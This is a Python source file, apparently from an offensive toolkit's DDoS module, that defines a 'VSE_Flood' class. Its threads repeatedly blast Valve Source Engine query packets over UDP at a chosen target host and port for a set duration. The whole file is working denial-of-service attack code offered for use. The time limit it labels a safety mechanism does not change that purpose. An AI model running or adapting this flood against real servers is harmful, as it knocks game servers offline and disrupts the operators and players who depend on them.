from bane.ddos.utils import *

class VSE_Flood(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        threads_daemon=True,
        interval=0.001,
        connection=True,
        duration=60,
        threads=1,
        limiting=True,
        logs=False,
    ):
        self.target = u
        self.port = p
        self.payload = b"\xff\xff\xff\xffTSource Engine Query\x00"  # read more at https://developer.valvesoftware.com/wiki/Server_queries
        self.interval = interval
        self.connection = connection
        self.duration = duration
        self.limiting = limiting
        self.logs = logs
        self.stop = False
        self.counter = 0
        self.fails=0
        self.start = time.time()
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            tm = time.time()
            while True:
                if (
                    int(time.time() - self.start) >= self.duration
                ):  # this is a safety mechanism so the attack won't run forever
                    break
                if self.stop == True:
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    if self.connection == True:
                        s.connect((self.target, self.port))
                    s.sendto(self.payload, (self.target, self.port))
                    self.counter += 1
                    if (self.logs == True) and (int(time.time() - tm) == 1):
                        sys.stdout.write("\rPackets: {}   ".format(self.counter))
                        sys.stdout.flush()
                        tm = time.time()
                    if self.limiting == True:
                        time.sleep(self.interval)
                except:
                    self.fails+=1
                    try:
                        time.sleep(self.interval)
                    except:
                        pass
            self.kill()
        except:
            pass